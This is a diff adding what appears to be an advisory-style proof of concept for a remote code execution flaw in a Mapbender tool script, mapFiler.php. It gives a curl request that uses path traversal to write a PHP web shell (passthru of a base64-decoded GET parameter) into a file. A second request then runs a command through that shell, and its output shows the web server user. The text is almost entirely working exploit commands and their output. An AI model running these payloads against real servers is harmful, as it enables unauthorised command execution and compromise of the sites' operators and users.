@@ -1,0 +1,27 @@
+Calling
+
+curl -d "myLocation=../tmp/.&factor=<?php passthru(base64_decode(
+   \$_GET[c])) ?>.php&button=let's go" http://www.example.com/
+   tools/mapFiler.php
+
+creates a file
+
+tmp/_\<\?php\ passthru\(base64_decode\(\$_GET\[c\]\)\)\ \?\>.php.
+
+with the content:
+
+#Modified by MapbenderTools
+#Date: 14.01.2008
+#Factor: <?php passthru(base64_decode($_GET[c])) ?>.php
+
+This script can then be executed by calling:
+
+curl -g 'http://www.example.com/tmp/_<%3fphp%20passthru(base64_decode(
+   $_GET[c]))%20%3f>.php.?c=aWQ'
+
+It returns:
+
+#Modified by MapbenderTools
+#Date: 15.01.2008
+#Factor: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+.php
